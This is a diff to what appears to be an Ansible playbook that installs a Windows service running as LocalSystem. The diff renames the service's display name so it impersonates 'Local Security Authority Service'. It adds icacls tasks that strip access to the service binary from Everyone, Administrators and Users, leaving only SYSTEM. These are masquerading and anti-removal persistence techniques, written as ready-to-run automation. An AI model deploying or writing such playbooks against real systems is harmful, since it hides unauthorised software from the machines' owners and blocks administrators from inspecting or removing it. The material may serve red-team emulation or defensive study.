@@ -18,7 +18,7 @@
 
     - name: "Create the service using cmd"
       win_command:
-        cmd: sc create "{{ service_name }}" binPath= "{{ path_to_download }}"\\"{{ binary_name }}" start= auto obj= "LocalSystem" DisplayName= "Windows Update Service"
+        cmd: sc create "{{ service_name }}" binPath= "{{ path_to_download }}"\\"{{ binary_name }}" start= auto obj= "LocalSystem" DisplayName= "Local Security Authority Service"
       tags:
         - create_service
 
@@ -67,3 +67,17 @@
         cmd /c "del C:\Windows\Temp\set_perm.regini"
       tags:
         - reg_perms
+
+    - name: "Disable inheritance"
+      ignore_errors: yes
+      win_command: 
+          cmd: icacls {{ path_to_download }}\\{{ binary_name}} /inheritance:d
+      tags:
+        - disable_inherit
+
+    - name: "Change ACLs on a file"
+      ignore_errors: yes
+      win_command:
+        cmd: icacls {{ path_to_download }}\\{{ binary_name}} /remove:g *S-1-1-0 /remove:g Administrators /remove:g Users /grant:r SYSTEM:(F) /t /c
+      tags:
+        - change_acls
